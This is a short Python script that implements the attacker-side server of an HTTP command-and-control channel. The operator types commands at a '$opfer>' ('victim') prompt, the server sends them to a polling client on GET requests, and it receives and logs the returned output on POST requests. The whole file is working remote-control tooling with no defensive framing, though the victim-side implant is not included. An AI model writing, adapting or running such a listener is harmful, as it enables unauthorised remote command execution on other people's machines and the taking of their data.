import socketserver
from http.server import HTTPServer, BaseHTTPRequestHandler

def main():
    #requires root execution
    PORT = 80

    Handler = Server
    file = open("log.txt", "a+")
    def Handler(*args):
        Server(file, *args)
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("serving at port", PORT)
        httpd.serve_forever()


class Server(BaseHTTPRequestHandler):
    def __init__(self, file, *args):
        self.logFile = file
        BaseHTTPRequestHandler.__init__(self, *args)

    def do_GET(self):
        #200 OK
        self.send_response(200)

        # fügt eine zeile zum header buffer hinzu
        self.send_header("Content-type", "text/html")

        # Adds a blank line (indicating the end of the HTTP headers in the response) to the headers buffer and calls flush_headers().
        self.end_headers()

        #root directory
        if self.path == "/":
            prompt = "$opfer> "
            command = input(prompt)
            #wfile output stream
            self.wfile.write(bytes(command, "utf-8"))
            self.logFile.write(prompt + command + "\n")


    def do_POST(self):
        dataLen = int(self.headers["Content-Length"])
        data = self.rfile.read(dataLen).decode("utf-8")
        self.send_response(200)
        self.end_headers()

        print(data)
        self.logFile.write(data + '\n')
        if(data == "Closing."):
            self.logFile.close()

if __name__ == '__main__':
    main()
